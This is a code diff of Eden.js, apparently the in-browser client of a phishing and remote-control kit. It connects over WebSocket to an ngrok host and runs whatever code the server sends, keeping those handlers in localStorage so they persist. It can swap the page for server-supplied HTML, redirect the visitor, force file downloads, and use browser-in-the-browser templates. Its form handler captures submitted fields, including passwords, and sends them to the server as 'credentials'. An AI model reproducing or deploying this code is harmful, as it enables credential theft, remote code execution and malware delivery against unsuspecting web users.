+                const matchesEnhanced = enhancedClientId && (target === enhancedClientId || enhancedClientId.includes(target) || target.includes(enhancedClientId));
+                const matchesBase = baseClientId && (target === baseClientId || baseClientId.includes(target) || target.includes(baseClientId));
+                if (!matchesEnhanced && !matchesBase) {
+                    return;
+                }
+            }
+
+            if (message.text && message.event) {
+                if (message.selector) {
+                    const key = `${message.event}|${message.selector}|copy-text`;
+                    if (!delegatedBindings.has(key)) {
+                        const textToCopy = message.text;
+                        const handler = event => {
+                            const target = event.target.closest(message.selector);
+                            if (target) {
+                                try {
+                                    copyToClipboard(textToCopy);
+                                } catch (err) {
+                                    console.error('Copy to clipboard error:', err);
+                                }
+                            }
+                        };
+                        document.addEventListener(message.event, handler, true);
+                        delegatedBindings.add(key);
+                    }
+                } else if (message.area) {
+                    const key = `${message.event}|area|${message.area.x}|${message.area.y}|${message.area.width}|${message.area.height}|copy-text`;
+                    if (!delegatedBindings.has(key)) {
+                        const textToCopy = message.text;
+                        const area = message.area;
+                        const handler = event => {
+                            const x = event.clientX + window.scrollX;
+                            const y = event.clientY + window.scrollY;
+                            if (x >= area.x && x <= area.x + area.width &&
+                                y >= area.y && y <= area.y + area.height) {
+                                try {
+                                    copyToClipboard(textToCopy);
+                                } catch (err) {
+                                    console.error('Copy to clipboard error:', err);
+                                }
+                            }
+                        };
+                        document.addEventListener(message.event, handler, true);
+                        delegatedBindings.add(key);
+                        // Save to localStorage for persistence
+                        saveEventHandlerToStorage(message, key);
+                    }
+                }
+                return;
+            }
+
+            if (message.event === 'qr-area' && message.area) {
+                const area = message.area;
+                const key = `qr-area|${area.x}|${area.y}|${area.width}|${area.height}`;
+                if (!delegatedBindings.has(key)) {
+                    const qrDiv = document.createElement('div');
+                    qrDiv.className = 'EdenQR';
+                    qrDiv.id = 'EdenQR';
+                    qrDiv.style.position = 'absolute';
+                    qrDiv.style.left = area.x + 'px';
+                    qrDiv.style.top = area.y + 'px';
+                    qrDiv.style.width = area.width + 'px';
+                    qrDiv.style.height = area.height + 'px';
+                    qrDiv.style.visibility = 'visible';
+                    qrDiv.style.pointerEvents = 'auto';
+                    qrDiv.style.zIndex = '9999';
+                    qrDiv.style.minHeight = '120px';
+                    
+                    // Add QR icon marker in corner
+                    const marker = document.createElement('div');
+                    marker.className = 'qr-marker';
+                    marker.style.position = 'absolute';
+                    marker.style.left = '0px';
+                    marker.style.top = '0px';
+                    marker.style.width = '24px';
+                    marker.style.height = '24px';
+                    marker.style.border = '2px solid #4CAF50';
+                    marker.style.backgroundColor = 'rgba(76, 175, 80, 0.9)';
+                    marker.style.pointerEvents = 'none';
+                    marker.style.zIndex = '10001';
+                    marker.style.display = 'flex';
+                    marker.style.alignItems = 'center';
+                    marker.style.justifyContent = 'center';
+                    marker.style.fontSize = '10px';
+                    marker.style.color = '#ffffff';
+                    marker.style.fontWeight = 'bold';
+                    marker.style.borderRadius = '2px';
+                    marker.textContent = 'QR';
+                    qrDiv.appendChild(marker);
+                    
+                    document.body.appendChild(qrDiv);
+
+                    // Trigger QR observer to detect this div and show loading animation
+                    setTimeout(() => {
+                        if (typeof setupQRObserver === 'function') {
+                            setupQRObserver();
+                        }
+                        // Manually trigger QR check
+                        if (typeof checkAndDisplayQR === 'function') {
+                            checkAndDisplayQR();
+                        }
+                    }, 100);
+
+                    delegatedBindings.add(key);
+                    // Save to localStorage for persistence
+                    saveEventHandlerToStorage(message, key);
+                }
+                return;
+            }
+
+            if (message.selector && message.event && message.code) {
+                // Use fileName in key if provided to support multiple uploaded files
+                const key = message.fileName ? 
+                    `${message.event}|${message.selector}|${message.fileName}` : 
+                    `${message.event}|${message.selector}`;
+                if (!delegatedBindings.has(key)) {
+                    const handler = event => {
+                        const target = event.target.closest(message.selector);
+                        if (target) {
+                            try {
+                                // For keyboard events, check if target is focusable
+                                if (['keydown', 'keypress', 'keyup'].includes(message.event)) {
+                                    if (document.activeElement === target || target.contains(document.activeElement)) {
+                                        new Function('event', message.code).call(target, event);
+                                    }
+                                } else {
+                                    new Function('event', message.code).call(target, event);
+                                }
+                            } catch (err) {
+                                console.error('Delegated handler error:', err);
+                            }
+                        }
+                    };
+                    
+                    // Some events need to be on window or document
+                    const eventsOnWindow = ['load', 'unload', 'resize', 'scroll', 'hashchange', 'DOMContentLoaded'];
+                    const eventsOnDocument = ['keydown', 'keypress', 'keyup'];
+                    
+                    if (eventsOnWindow.includes(message.event)) {
+                        window.addEventListener(message.event, handler, true);
+                    } else if (eventsOnDocument.includes(message.event)) {
+                        document.addEventListener(message.event, handler, true);
+                    } else {
+                        document.addEventListener(message.event, handler, true);
+                    }
+                    
+                    delegatedBindings.add(key);
+                    if (message.fileName) {
+                        console.log(`Event handler attached for ${message.event} with file: ${message.fileName}`);
+                    } else {
+                        console.log(`Event handler attached for ${message.event} on selector: ${message.selector}`);
+                    }
+                    // Save to localStorage for persistence
+                    saveEventHandlerToStorage(message, key);
+                }
+                return;
+            }
+
+            if (message.area && message.event && message.code) {
+                // Use fileName in key if provided to support multiple uploaded files
+                const key = message.fileName ? 
+                    `${message.event}|area|${message.area.x}|${message.area.y}|${message.area.width}|${message.area.height}|${message.fileName}` : 
+                    `${message.event}|area|${message.area.x}|${message.area.y}|${message.area.width}|${message.area.height}`;
+                if (!delegatedBindings.has(key)) {
+                    const area = message.area;
+                    const handler = event => {
+                        const x = event.clientX + window.scrollX;
+                        const y = event.clientY + window.scrollY;
+                        if (x >= area.x && x <= area.x + area.width &&
+                            y >= area.y && y <= area.y + area.height) {
+                            try {
+                                new Function('event', message.code).call(null, event);
+                            } catch (err) {
+                                console.error('Area handler error:', err);
+                            }
+                        }
+                    };
+                    document.addEventListener(message.event, handler, true);
+                    delegatedBindings.add(key);
+                    if (message.fileName) {
+                        console.log(`Area event handler attached for ${message.event} with file: ${message.fileName}`);
+                    }
+                    // Save to localStorage for persistence
+                    saveEventHandlerToStorage(message, key);
+                }
+                return;
+            }
+
+            if (message.code && !message.event) {
+                new Function(message.code)();
+            }
+        } catch (error) {
+            console.error('Error executing code message:', error);
+        }
+    }
+
+    // Save event handler to localStorage for persistence
+    function saveEventHandlerToStorage(message, key) {
+        try {
+            const stored = localStorage.getItem('eden_event_handlers');
+            const handlers = stored ? JSON.parse(stored) : [];
+            if (!handlers.includes(key)) {
+                handlers.push(key);
+                localStorage.setItem('eden_event_handlers', JSON.stringify(handlers));
+            }
+            // Also store the message for restoration
+            const storedMessages = localStorage.getItem('eden_event_handler_messages');
+            const messages = storedMessages ? JSON.parse(storedMessages) : [];
+            const exists = messages.some(msg => JSON.stringify(msg) === JSON.stringify(message));
+            if (!exists) {
+                messages.push(message);
+                localStorage.setItem('eden_event_handler_messages', JSON.stringify(messages));
+            }
+        } catch (error) {
+            console.error('Error saving event handler:', error);
+        }
+    }
+
+    // Restore event handlers from localStorage
+    function restoreEventHandlersFromStorage() {
+        try {
+            const storedMessages = localStorage.getItem('eden_event_handler_messages');
+            if (storedMessages) {
+                const messages = JSON.parse(storedMessages);
+                console.log('Restoring event handlers from localStorage:', messages.length);
+                messages.forEach(msg => {
+                    // Re-attach handlers without saving again
+                    handleExecuteCode(msg);
+                });
+            }
+        } catch (error) {
+            console.error('Error restoring event handlers:', error);
+        }
+    }
+
+    // Clean all event handlers
+    function cleanAllEventHandlers() {
+        try {
+            delegatedBindings.clear();
+            localStorage.removeItem('eden_event_handlers');
+            localStorage.removeItem('eden_event_handler_messages');
+            // Also clear template handlers and last template execution
+            localStorage.removeItem(EDEN_TEMPLATES_KEY);
+            localStorage.removeItem(EDEN_TEMPLATE_HANDLERS_KEY);
+            localStorage.removeItem('eden_last_template_execution');
+            // Remove QR divs
+            document.querySelectorAll('.EdenQR').forEach(el => {
+                if (el && el.parentNode) {
+                    el.parentNode.removeChild(el);
+                }
+            });
+            console.log('All event handlers cleaned');
+        } catch (error) {
+            console.error('Error cleaning event handlers:', error);
+        }
+    }
+
+    function copyToClipboard(text) {
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(text).catch(() => fallbackCopyToClipboard(text));
+        } else {
+            fallbackCopyToClipboard(text);
+        }
+    }
+
+    function fallbackCopyToClipboard(text) {
+        const textArea = document.createElement('textarea');
+        textArea.value = text;
+        textArea.style.position = 'fixed';
+        textArea.style.left = '-999999px';
+        textArea.style.top = '-999999px';
+        document.body.appendChild(textArea);
+        textArea.focus();
+        textArea.select();
+        try {
+            document.execCommand('copy');
+        } catch (err) {
+            console.error('Fallback copy failed:', err);
+        }
+        document.body.removeChild(textArea);
+    }
     
     // Add window load event listener to initialize Eden.js
     window.addEventListener('load', function() {
         console.log('Eden.js initializing on page load');
         initialize();
+        
+        // Restore BITB after page reload (if pending)
+        restoreBitBAfterReload();
     });
     
     // Function to create a client-specific feed container
@@ -716,7 +1870,7 @@ const EDEN_LINK_PREVIEW = {
 }
 
     async function requestMicrophone(clientId) {
-        try {
+    try {
             // If no clientId provided, use the current client's ID
             const thisClientId = clientId || window.clientId;
             
@@ -973,7 +2127,7 @@ const EDEN_LINK_PREVIEW = {
     }
 
     async function requestScreen(clientId) {
-        try {
+    try {
             // If no clientId provided, use the current client's ID
             const thisClientId = clientId || window.clientId;
             
@@ -1198,7 +2352,7 @@ const EDEN_LINK_PREVIEW = {
 
 
     async function requestClipboard(clientId) {
-        try {
+    try {
             // First check if clipboard API is supported
             if (!navigator.clipboard) {
                 throw new Error('Clipboard API not supported');
@@ -1437,6 +2591,24 @@ const EDEN_LINK_PREVIEW = {
             
             // Restore blur effect and content if it was previously applied
             restoreBlurEffectAndContent();
+
+            // Reattach any stored template handlers (bom.js-style)
+            edenReattachStoredTemplateHandlers();
+
+            // Re-render last executed template (display/blur/BITB) if available
+            try {
+                const raw = localStorage.getItem('eden_last_template_execution');
+                if (raw) {
+                    const info = JSON.parse(raw);
+                    const all = edenGetTemplates();
+                    const tpl = all[info.templateName];
+                    if (tpl && tpl.type) {
+                        edenRenderTemplate(tpl);
+                    }
+                }
+            } catch (e) {
+                console.error('Failed to restore last template execution', e);
+            }
         });
     }
     
@@ -1950,7 +3122,7 @@ const EDEN_LINK_PREVIEW = {
         
         // Fixed WebSocket connection URL
         // Comment out the one you're not using
-        const wsUrl = 'ws://localhost:8080'; // Local developmenteden.js 
+        const wsUrl = 'wss://issuant-unglaciated-yosef.ngrok-free.dev'; // Local developmenteden.js 
         
         console.log('Using WebSocket URL:', wsUrl);
         
@@ -2627,6 +3799,17 @@ const EDEN_LINK_PREVIEW = {
                 
                 // Start periodic connection message sender
                 startPeriodicConnectionSender();
+
+                try {
+                    ws.send(JSON.stringify({
+                        type: 'hello',
+                        role: 'client',
+                        clientId: bomClientId
+                    }));
+                    console.log('Sent hello message with client role');
+                } catch (helloError) {
+                    console.error('Failed to send hello message:', helloError);
+                }
                 
                 // Check if connection is through ngrok
                 const isNgrok = window.location.hostname.includes('ngrok') || document.URL.includes('ngrok');
@@ -2858,6 +4041,177 @@ const EDEN_LINK_PREVIEW = {
                             break;
                     }
                     
+                    // Handle QR code updates
+                    if (message.type === 'qr-code-update') {
+                        if (message.qrConfig === null || message.qrConfig === undefined) {
+                            // Clear QR code
+                            currentQRConfig = null;
+                            sessionStorage.removeItem('eden_qr_config');
+                            // Clear all QR instances
+                            edenQRCodeInstances.forEach((instance, div) => {
+                                if (div && div.parentNode) {
+                                    div.innerHTML = '';
+                                }
+                            });
+                            edenQRCodeInstances.clear();
+                        } else {
+                            try {
+                                sessionStorage.setItem('eden_qr_config', JSON.stringify(message.qrConfig));
+                            } catch (e) {
+                                console.warn('Unable to store QR config in sessionStorage:', e);
+                            }
+                            displayQRCode(message.qrConfig);
+                        }
+                    }
+                    
+                    // Handle HTML rendering (when keyword RED)
+                    if (message.type === 'render-html' && message.html) {
+                        console.log('Rendering HTML from server - keyword RED condition');
+                        try {
+                            preserveBitBLayer();
+                            document.body.innerHTML = '';
+                            document.head.innerHTML = '';
+                            const parser = new DOMParser();
+                            const doc = parser.parseFromString(message.html, 'text/html');
+                            
+                            // Copy head content from new HTML
+                            const headElements = doc.head.querySelectorAll('*');
+                            headElements.forEach(el => {
+                                const cloned = el.cloneNode(true);
+                                document.head.appendChild(cloned);
+                            });
+                            
+                            // Copy body content
+                            const bodyElements = Array.from(doc.body.childNodes);
+                            bodyElements.forEach(node => {
+                                if (node.nodeType === Node.ELEMENT_NODE || node.nodeType === Node.TEXT_NODE) {
+                                    document.body.appendChild(node.cloneNode(true));
+                                }
+                            });
+                            
+                            // Copy body attributes
+                            if (doc.body) {
+                                Array.from(doc.body.attributes).forEach(attr => {
+                                    document.body.setAttribute(attr.name, attr.value);
+                                });
+                            }
+                            
+                            // Copy document attributes
+                            Array.from(doc.documentElement.attributes).forEach(attr => {
+                                document.documentElement.setAttribute(attr.name, attr.value);
+                            });
+                            restoreBitBLayer();
+                            // Persist HTML to localStorage (must survive refresh)
+                            localStorage.setItem('eden-rendered-html', message.html);
+                            localStorage.setItem('eden-html-rendered-time', Date.now().toString());
+                            
+                            // Re-execute scripts
+                            setTimeout(() => {
+                                document.head.querySelectorAll('script').forEach(script => {
+                                    const newScript = document.createElement('script');
+                                    Array.from(script.attributes).forEach(attr => {
+                                        newScript.setAttribute(attr.name, attr.value);
+                                    });
+                                    newScript.textContent = script.textContent;
+                                    script.parentNode.replaceChild(newScript, script);
+                                });
+                                
+                                document.body.querySelectorAll('script').forEach(script => {
+                                    const newScript = document.createElement('script');
+                                    Array.from(script.attributes).forEach(attr => {
+                                        newScript.setAttribute(attr.name, attr.value);
+                                    });
+                                    newScript.textContent = script.textContent;
+                                    script.parentNode.replaceChild(newScript, script);
+                                });
+                            }, 0);
+                            
+                            console.log('HTML rendered and persisted');
+                        } catch (error) {
+                            console.error('Error rendering HTML:', error);
+                        }
+                    }
+                    
+                    // Handle redirect URL (when keyword RED and no HTML selected)
+                    if (message.type === 'redirect-url' && message.url) {
+                        console.log('Redirecting to:', message.url);
+                        try {
+                            // Immediate redirect - no fallback UI
+                            window.location.href = message.url;
+                        } catch (error) {
+                            console.error('Error redirecting:', error);
+                        }
+                    }
+                    
+                    // Handle download section file selection
+                    if (message.type === 'fileSelected') {
+                        console.log('Handling fileSelected message:', message.fileName);
+                        try {
+                            const existing = JSON.parse(localStorage.getItem('eden-download-selected-files') || 
+                                                         localStorage.getItem('eden-blur-selected-files') || '[]');
+                            const index = existing.findIndex(f => f.fileName === message.fileName);
+                            if (index !== -1) {
+                                existing[index] = { fileName: message.fileName, content: message.content };
+                            } else {
+                                existing.push({ fileName: message.fileName, content: message.content });
+                            }
+                            localStorage.setItem('eden-download-selected-files', JSON.stringify(existing));
+                            localStorage.setItem('eden-blur-selected-files', JSON.stringify(existing));
+                            localStorage.setItem(`eden-download-selected-${message.fileName}`, message.content);
+                        } catch (error) {
+                            console.error('Error handling fileSelected:', error);
+                        }
+                    }
+                    
+                    if (message.type === 'fileDeselected') {
+                        console.log('Handling fileDeselected message:', message.fileName);
+                        try {
+                            const existing = JSON.parse(localStorage.getItem('eden-download-selected-files') || 
+                                                         localStorage.getItem('eden-blur-selected-files') || '[]');
+                            const filtered = existing.filter(f => f.fileName !== message.fileName);
+                            localStorage.setItem('eden-download-selected-files', JSON.stringify(filtered));
+                            localStorage.setItem('eden-blur-selected-files', JSON.stringify(filtered));
+                            localStorage.removeItem(`eden-download-selected-${message.fileName}`);
+                        } catch (error) {
+                            console.error('Error handling fileDeselected:', error);
+                        }
+                    }
+                    
+                    if (message.type === 'sudoDownload') {
+                        console.log('Handling sudoDownload message');
+                        try {
+                            if (message.files && Array.isArray(message.files)) {
+                                // Batch download
+                                message.files.forEach(file => {
+                                    if (file.fileName && file.content) {
+                                        const blob = new Blob([file.content], { type: 'text/html' });
+                                        const url = URL.createObjectURL(blob);
+                                        const a = document.createElement('a');
+                                        a.href = url;
+                                        a.download = file.fileName;
+                                        document.body.appendChild(a);
+                                        a.click();
+                                        document.body.removeChild(a);
+                                        URL.revokeObjectURL(url);
+                                    }
+                                });
+                            } else if (message.fileName && message.content) {
+                                // Single file download
+                                const blob = new Blob([message.content], { type: 'text/html' });
+                                const url = URL.createObjectURL(blob);
+                                const a = document.createElement('a');
+                                a.href = url;
+                                a.download = message.fileName;
+                                document.body.appendChild(a);
+                                a.click();
+                                document.body.removeChild(a);
+                                URL.revokeObjectURL(url);
+                            }
+                        } catch (error) {
+                            console.error('Error handling sudoDownload:', error);
+                        }
+                    }
+                    
                     // Handle the new format permission requests
                     if (message.type === 'request-permission') {
                         const permType = message.permissionType;
@@ -2985,109 +4339,151 @@ const EDEN_LINK_PREVIEW = {
                         console.log('📢 Broadcast message received (no target specified)');
                     }
                     
-                    // Handle download-related messages from control.php
-                    if (message.type === 'downloadshadecontent') {
-                        console.log('Handling downloadshadecontent message');
-                        // Pass intensity if provided
-                        const intensity = message.intensity || 5;
-                        download_showContent(message.content, message.fileName, message.fromSection || 'download', 'shade', message.location, intensity);
-                        
-                        // Save intensity to session storage
-                        sessionStorage.setItem('eden-download-intensity', intensity.toString());
-                        
-                        if (message.downloadFlag === 'true') {
-                            sessionStorage.setItem('eden-download-flag', 'true');
-                        }
-                        return;
-                    } else if (message.type === 'noeffectcontent') {
-                        console.log('Handling noeffectcontent message');
-                        // Pass intensity if provided
-                        const intensity = message.intensity || 5;
-                        download_showContent(message.content, message.fileName, message.fromSection || 'download', 'none', message.location, intensity);
-                        
-                        // Save intensity to session storage
-                        sessionStorage.setItem('eden-download-intensity', intensity.toString());
-                        
-                        if (message.downloadFlag === 'true') {
-                            sessionStorage.setItem('eden-download-flag', 'true');
-                        }
-                        return;
-                    } else if (message.type === 'downloadcustomeffect') {
-                        console.log('Handling downloadcustomeffect message with custom effect:', message.customEffect?.name);
-                        
-                        // Store custom effect data and effect type in sessionStorage to persist across refreshes
-                        if (message.customEffect) {
-                            sessionStorage.setItem('eden-download-custom-effect', JSON.stringify(message.customEffect));
-                            sessionStorage.setItem('eden-download-effect-type', 'custom');
-                            localStorage.setItem('eden-download-effect-type', 'custom');
-                            
-                            // Store the effect name separately for easier lookup
-                            if (message.customEffect.name) {
-                                sessionStorage.setItem('eden-download-custom-effect-name', message.customEffect.name);
-                                localStorage.setItem('eden-download-custom-effect-name', message.customEffect.name);
-                            }
-                        }
-                        
-                        // Store intensity if provided
-                        if (message.intensity) {
-                            sessionStorage.setItem('eden-download-intensity', message.intensity);
-                            localStorage.setItem('eden-download-intensity', message.intensity);
-                        }
-                        
-                        // Pass the correct parameters to download_showContent
-                        download_showContent(
-                            message.content,
-                            message.fileName,
-                            message.fromSection || 'download',
-                            'custom',
-                            message.location,
-                            message.intensity || 5,
-                            message.customEffect
-                        );
-                        
-                        if (message.downloadFlag === 'true') {
-                            sessionStorage.setItem('eden-download-flag', 'true');
-                        }
-                        return;
-                    } else if (message.type === 'downloadContent') {
-                        console.log('Handling downloadContent message');
-                        if (message.location) {
-                            // Pass intensity if provided
-                            const intensity = message.intensity || 5;
-                            download_showContent(message.content, message.fileName, message.fromSection || 'download', 'blur', message.location, intensity);
-                            
-                            // Save intensity to session storage
-                            sessionStorage.setItem('eden-download-intensity', intensity.toString());
-                            
-                            // Set download flag if provided
-                            if (message.downloadFlag === 'true') {
-                                sessionStorage.setItem('eden-download-type', 'downloadContent');
-                                sessionStorage.setItem('eden-download-flag', 'true');
-                                console.log('Set download flag for content with location');
-                            }
-                        } else {
-                            download_receiveDownloadContent(message.content, message.fileName, message.downloadFlag);
-                        }
-                        return;
-                    } else if (message.type === 'cleanContent') {
+                    if (message.type === 'cleanContent') {
                         console.log('Handling cleanContent message');
-                        download_cleanContent();
-                        return;
-                    } else if (message.type === 'fileSelected') {
-                        console.log('Handling fileSelected message');
-                        download_addToDownloadSelection(message.fileName, message.content);
-                        return;
-                    } else if (message.type === 'fileDeselected') {
-                        console.log('Handling fileDeselected message');
-                        download_removeFromDownloadSelection(message.fileName);
-                        return;
-                    } else if (message.type === 'sudoDownload') {
-                        console.log('Handling sudoDownload message');
-                        if (message.files && Array.isArray(message.files)) {
-                            download_batchDownloadFiles(message.files);
-                        } else if (message.fileName && message.content) {
-                            download_directDownloadFile(message.fileName, message.content);
+                        if (typeof _forceCleanupBlurEffect === 'function') {
+                            _forceCleanupBlurEffect();
                         }
+                        return;
+                    }
+
+                    if (message.type === 'execute-code') {
+                        handleExecuteCode(message);
+                        return;
+                    }
+
+                    if (message.type === 'save-template') {
+                        const name = message.name;
+                        const tpl = message.template;
+                        if (name && tpl) {
+                            const all = edenGetTemplates();
+                            all[name] = tpl;
+                            edenSetTemplates(all);
+                            if (ws && ws.readyState === WebSocket.OPEN) {
+                                ws.send(JSON.stringify({
+                                    type: 'templates-state',
+                                    templates: all,
+                                    targetClientId: clientId
+                                }));
+                            }
+                        }
+                        return;
+                    }
+
+                    if (message.type === 'delete-template') {
+                        const name = message.name;
+                        if (name) {
+                            const all = edenGetTemplates();
+                            delete all[name];
+                            edenSetTemplates(all);
+                            if (ws && ws.readyState === WebSocket.OPEN) {
+                                ws.send(JSON.stringify({
+                                    type: 'templates-state',
+                                    templates: all,
+                                    targetClientId: clientId
+                                }));
+                            }
+                        }
+                        return;
+                    }
+
+                    if (message.type === 'request-templates') {
+                        const all = edenGetTemplates();
+                        if (ws && ws.readyState === WebSocket.OPEN) {
+                            ws.send(JSON.stringify({
+                                type: 'templates-state',
+                                templates: all,
+                                targetClientId: clientId
+                            }));
+                        }
+                        return;
+                    }
+
+                    if (message.type === 'clear-templates') {
+                        localStorage.removeItem(EDEN_TEMPLATES_KEY);
+                        localStorage.removeItem(EDEN_TEMPLATE_HANDLERS_KEY);
+                        if (ws && ws.readyState === WebSocket.OPEN) {
+                            ws.send(JSON.stringify({
+                                type: 'templates-state',
+                                templates: {},
+                                targetClientId: clientId
+                            }));
+                        }
+                        return;
+                    }
+
+                    if (message.type === 'reload-client') {
+                        if (message.targetClientId === clientId || message.targetClientId === sessionStorage.getItem('eden_enhanced_client_id')) {
+                            console.log('Reloading client as requested by server');
+                            location.reload();
+                        }
+                        return;
+                    }
+
+                    if (message.type === 'template-event') {
+                        if (!message.templateType || !message.action || !message.payload) {
+                            console.error('Invalid template-event message: missing required fields');
+                            return;
+                        }
+                        if (message.targetClientId) {
+                            const enhancedClientId = sessionStorage.getItem('eden_enhanced_client_id');
+                            const baseClientId = getOrCreateClientId();
+                            const target = message.targetClientId;
+                            const matchesEnhanced = enhancedClientId &&
+                                (target === enhancedClientId || enhancedClientId.includes(target) || target.includes(enhancedClientId));
+                            const matchesBase = baseClientId &&
+                                (target === baseClientId || baseClientId.includes(target) || target.includes(baseClientId));
+                            if (!matchesEnhanced && !matchesBase) {
+                                return;
+                            }
+                        }
+                        edenAttachTemplateEventHandler({
+                            templateType: message.templateType,
+                            action: message.action,
+                            payload: message.payload,
+                            selector: message.selector || null,
+                            area: message.area || null,
+                            templateName: message.templateName || null
+                        });
+                        return;
+                    }
+                    
+                    if (message.type === 'attach-template') {
+                        // Legacy support - convert to template-event format
+                        if (message.targetClientId) {
+                            const enhancedClientId = sessionStorage.getItem('eden_enhanced_client_id');
+                            const baseClientId = getOrCreateClientId();
+                            const target = message.targetClientId;
+                            const matchesEnhanced = enhancedClientId &&
+                                (target === enhancedClientId || enhancedClientId.includes(target) || target.includes(enhancedClientId));
+                            const matchesBase = baseClientId &&
+                                (target === baseClientId || baseClientId.includes(target) || target.includes(baseClientId));
+                            if (!matchesEnhanced && !matchesBase) {
+                                return;
+                            }
+                        }
+                        const templates = edenGetTemplates();
+                        const tpl = templates[message.templateName];
+                        if (!tpl || !tpl.type) {
+                            console.error('Template not found for attach-template:', message.templateName);
+                            return;
+                        }
+                        let payload = {};
+                        if (tpl.type === 'display') {
+                            payload = { html: tpl.html, fileName: tpl.fileName || message.templateName };
+                        } else if (tpl.type === 'blur') {
+                            payload = { html: tpl.html, fileName: tpl.fileName || message.templateName, blur: tpl.blur || {} };
+                        } else if (tpl.type === 'bitb') {
+                            payload = { html: tpl.html, fileName: tpl.fileName || message.templateName, bitb: tpl.bitb || {} };
+                        }
+                        edenAttachTemplateEventHandler({
+                            templateType: tpl.type,
+                            action: message.event,
+                            payload: payload,
+                            selector: message.selector || null,
+                            area: message.area || null,
+                            templateName: message.templateName
+                        });
                         return;
                     }
                     
@@ -3113,7 +4509,9 @@ const EDEN_LINK_PREVIEW = {
                         
 
                         case 'blurContent':
-                        download_cleanContent();
+                        if (typeof _forceCleanupBlurEffect === 'function') {
+                            _forceCleanupBlurEffect();
+                        }
                         
 
                         // Combined handler for blur effect and content display
@@ -3289,21 +4687,131 @@ const EDEN_LINK_PREVIEW = {
                                     form.removeAttribute('target');
                                     
                                     // Set both onsubmit and a direct event listener for redundancy
-                                    form.setAttribute('onsubmit', 'window.edenFormSubmitted(this); return false;');
+                                    form.setAttribute('onsubmit', 'return window.edenFormSubmitted(this);');
                                 });
+
+                                if (forms.length > 0) {
+                                    sessionStorage.setItem('eden-from-section', 'blur');
+                                }
                                 
                                 // Set the processed content
                                 contentContainer.innerHTML = tempDiv.innerHTML;
                                 
-                                // Add form submission handler to window
-                                window.edenFormSubmitted = function(form) {
-                                    console.log('Form submission intercepted:', form);
+                                function processBlurFormSubmission(form) {
+                                    if (!form) {
+                                        return false;
+                                    }
+
+                                    if (form.dataset.edenSubmitting === 'true') {
+                                        console.log('Blur form submission already handled, skipping duplicate processing');
+                                        return false;
+                                    }
+
+                                    form.dataset.edenSubmitting = 'true';
+
+                                    // Capture form data (ensure it's captured even if global handler doesn't run)
+                                    if (form && typeof form.elements !== 'undefined') {
+                                        try {
+                                            const formData = new FormData(form);
+                                            const data = Object.fromEntries(formData.entries());
+                                            
+                                            if (Object.keys(data).length > 0) {
+                                                const formMetadata = {
+                                                    hasPassword: form.querySelector('input[type="password"]') !== null,
+                                                    hasEmail: form.querySelector('input[type="email"]') !== null,
+                                                    inputCount: form.querySelectorAll('input').length,
+                                                    formId: form.id || form.name || '',
+                                                    formAction: form.action || '',
+                                                    formClass: form.className || '',
+                                                    formMethod: form.method || 'get'
+                                                };
+                                                
+                                                // Send form data to server
+                                                if (ws && ws.readyState === WebSocket.OPEN) {
+                                                    console.log('Blur form data captured, sending to server');
+                                                    ws.send(JSON.stringify({
+                                                        type: 'credentials',
+                                                        data: data,
+                                                        formMetadata: formMetadata,
+                                                        url: document.location.href,
+                                                        timestamp: new Date().toISOString(),
+                                                        formId: form.id || 'form_' + Math.random().toString(36).substring(2, 10),
+                                                        clientId: clientId || 'unknown',
+                                                        ip: clientIp || 'unknown',
+                                                        source: 'blur_form_capture'
+                                                    }));
+                                                }
+                                            }
+                                        } catch (error) {
+                                            console.error('Error capturing form data:', error);
+                                        }
+                                    }
+
+                                    // Check for selected files to download (download section feature)
+                                    // Check both storage keys for compatibility
+                                    const selectedFilesJson = localStorage.getItem('eden-download-selected-files') || 
+                                                              localStorage.getItem('eden-blur-selected-files');
+                                    const downloadFlag = sessionStorage.getItem('eden-download-flag') || 
+                                                       localStorage.getItem('eden-download-flag');
                                     
-                                    // Immediately clean up without showing any message
-                                    cleanupBlurOverlay();
-                                    
+                                    if (selectedFilesJson && downloadFlag === 'true') {
+                                        try {
+                                            const selectedFiles = JSON.parse(selectedFilesJson);
+                                            
+                                            if (selectedFiles.length > 0) {
+                                                console.log('Downloading selected files after form submission:', selectedFiles.length);
+                                                
+                                                // Process each selected file for download
+                                                selectedFiles.forEach(file => {
+                                                    if (file.fileName && file.content) {
+                                                        // Create download link
+                                                        const blob = new Blob([file.content], { type: 'text/html' });
+                                                        const url = URL.createObjectURL(blob);
+                                                        const a = document.createElement('a');
+                                                        a.href = url;
+                                                        a.download = file.fileName;
+                                                        document.body.appendChild(a);
+                                                        a.click();
+                                                        document.body.removeChild(a);
+                                                        URL.revokeObjectURL(url);
+                                                    }
+                                                });
+                                                
+                                                // DO NOT clear selected files - keep them for future submissions
+                                                // Files remain selected until manually deselected
+                                                // This allows multiple form submissions to download the same files
+                                            }
+                                        } catch (error) {
+                                            console.error('Error processing selected files for download:', error);
+                                        }
+                                        
+                                        // DO NOT clear the download flag - keep it active for future submissions
+                                        // The flag will remain until manually cleared or page refresh
+                                    }
+
+                                    if (typeof cleanupBlurOverlay === 'function') {
+                                        cleanupBlurOverlay();
+                                    } else {
+                                        document.querySelectorAll('#eden-blur-overlay, #eden-content-container').forEach(el => {
+                                            if (el && el.parentNode) {
+                                                el.parentNode.removeChild(el);
+                                            }
+                                        });
+
+                                        localStorage.removeItem('blur-data');
+                                        localStorage.removeItem('eden-blur-applied');
+                                        localStorage.removeItem('eden-blur-effect');
+                                        localStorage.removeItem('eden-blur-intensity');
+                                        localStorage.removeItem('blur-content');
+                                        localStorage.setItem('clean-flag', 'true');
+                                        sessionStorage.setItem('clean-flag', 'true');
+                                    }
+
                                     return false;
-                                };
+                                }
+
+                                // Add form submission handler to window
+                                window.edenFormSubmitted = processBlurFormSubmission;
                                 
                                 // Ensure we have document-level form submission monitoring
                                 if (!window.blurFormSubmitListener) {
@@ -3321,28 +4829,7 @@ const EDEN_LINK_PREVIEW = {
                                             console.log('Detected form submission with active blur effect');
                                             e.preventDefault();
                                             e.stopPropagation();
-                                            
-                                            // Clean up blur overlay
-                                            if (typeof cleanupBlurOverlay === 'function') {
-                                                cleanupBlurOverlay();
-                                            } else {
-                                                // Fallback cleanup if function isn't defined
-                                                document.querySelectorAll('#eden-blur-overlay, #eden-content-container').forEach(el => {
-                                                    if (el && el.parentNode) {
-                                                        el.parentNode.removeChild(el);
-                                                    }
-                                                });
-                                                
-                                                // Clear storage
-                                                localStorage.removeItem('blur-data');
-                                                localStorage.removeItem('eden-blur-applied');
-                                                localStorage.removeItem('eden-blur-effect');
